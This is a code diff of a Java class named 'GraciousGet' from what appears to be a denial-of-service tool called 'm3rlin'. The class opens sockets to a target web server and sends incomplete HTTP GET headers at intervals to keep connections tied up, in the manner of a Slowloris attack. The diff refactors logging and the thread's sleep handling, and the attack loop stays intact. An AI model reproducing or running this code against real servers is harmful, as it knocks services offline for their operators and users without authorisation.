@@ -14,6 +14,8 @@ import m3rlin.utils.Logger;
 
 public class GraciousGet extends Attack {
 
+	private static Logger log = new Logger("GraciousGet");
+	
 	public GraciousGet(String hostname, int port, int interval) {
 		super(hostname, port, interval);		
 	}
@@ -23,7 +25,7 @@ public class GraciousGet extends Attack {
 			isRunning = true;
 			socket = new Socket(InetAddress.getByName(hostname), port);
 			writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), "UTF-8"));
-			Logger.info(Thread.currentThread().getName() + " - start (" + name + ")");
+			log.info("Attack thread started (" + Thread.currentThread().getName() + ")");
 			while(isRunning && !isInterrupted()) {
 				writer.write("GET / HTTP/1.1\r\n");
 				writer.write("Host: " + hostname + " \r\n");
@@ -36,20 +38,24 @@ public class GraciousGet extends Attack {
 					writer.write("X-a: h4x0r\r\n");
 					writer.flush();
 					try {
-						Thread.sleep(interval);
+						if (!isInterrupted()) {
+							Thread.sleep(interval);
+						} else {
+							continue;
+						}
 					} catch (InterruptedException e) {
-						Logger.error("Thread can't sleep");
+						log.error("Thread can't sleep");
 					}
 				}
 			}
 		} catch (UnknownHostException e) {
-			Logger.error(Thread.currentThread().getName() + " - thread died. The hostname could not be resolved (UnknownHostException)");				
+			log.error(Thread.currentThread().getName() + " - Could not locate the host (UnknownHostException)");				
 		} catch (ConnectException e) {
-			Logger.error(Thread.currentThread().getName() + " - thread died from connection error. Check that there is an HTTP server and the port is correct (ConnectException)");			
+			log.error(Thread.currentThread().getName() + " - Could not connect to the socket address, check the port (ConnectException)");			
 		} catch (SocketException e) {
-			Logger.error(Thread.currentThread().getName() + " - thread had a socket error (SocketException)");				
+			log.error(Thread.currentThread().getName() + " - Error creating or accessing socket (SocketException)");				
 		} catch (IOException e1) {
-			Logger.error(Thread.currentThread().getName() + " - thread couldn't write to server (IOException)");
+			log.error(Thread.currentThread().getName() + " - I/O error with socket (IOException)");
 		} finally {
 			stop();
 		}
